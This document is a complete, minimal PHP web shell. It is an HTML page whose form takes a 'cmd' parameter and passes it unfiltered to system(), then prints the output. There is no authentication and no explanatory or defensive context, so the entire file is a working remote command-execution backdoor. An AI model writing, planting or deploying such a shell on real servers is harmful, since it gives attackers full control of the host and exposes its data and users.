<html>
  <body>
    <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
      <input type="text" name="cmd" id="cmd" size="100">
      <input type="submit" value="Run">
    </form>
    <span>Output:
      <pre>
        <?php
          if(isset($_GET['cmd']))
          {
            system($_GET['cmd'] . ' 2>&1');
          }
        ?>
      </pre>
    </span>
  </body>
</html>
